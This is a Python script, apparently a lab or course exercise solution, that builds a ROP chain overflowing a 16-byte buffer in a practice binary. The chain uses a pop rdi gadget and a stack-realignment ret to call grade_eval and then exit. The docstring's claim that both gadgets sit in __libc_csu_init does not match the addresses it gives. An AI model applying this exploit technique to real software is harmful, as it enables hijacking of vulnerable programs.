#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx (ROP).

``dark-calc-nx`` is a non-PIE binary (so ``.text`` addresses are fixed) whose
stack is NX and randomised, so instead of running code from the stack we reuse
gadgets of the binary itself.

``__libc_csu_init`` lives at 0x4019d0..0x401a34 and contains the two classic
gadgets used here:

    0x401a33 : pop rdi ; ret          (the REX byte 0x41 of "pop r15" + "ret")
    0x4019b3 : ret                    (plain "ret", used to realign the stack)

Chain (``input()`` only needs 16 + 8 bytes of padding):

    offset  0 : expression[16]          b"A" * 16
    offset 16 : saved rbp               b"B" * 8
    offset 24 : pop rdi ; ret
    offset 32 : 4                       <- first argument of grade_eval
    offset 40 : ret                     <- 8-byte stack realignment for printf
    offset 48 : grade_eval              -> prints "Hope A will be your grade!"
    offset 56 : pop rdi ; ret
    offset 64 : 0
    offset 72 : exit@plt                -> clean exit

The "ret" at offset 40 is needed because the SysV ABI requires ``rsp % 16 == 0``
at the moment of a ``call``; without it printf crashes inside a movaps.
"""
import struct
import sys

POP_RDI = 0x401A33      # pop rdi ; ret   (inside __libc_csu_init)
RET = 0x4019B3          # ret             (inside grade_eval)
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016E0

def q(x):
    return struct.pack("<Q", x)

payload = b"A" * 16          # expression[16]
payload += b"B" * 8          # saved rbp
payload += q(POP_RDI) + q(4) + q(RET) + q(GRADE_EVAL)
payload += q(POP_RDI) + q(0) + q(EXIT_PLT)

sys.stdout.buffer.write(payload + b"\n")
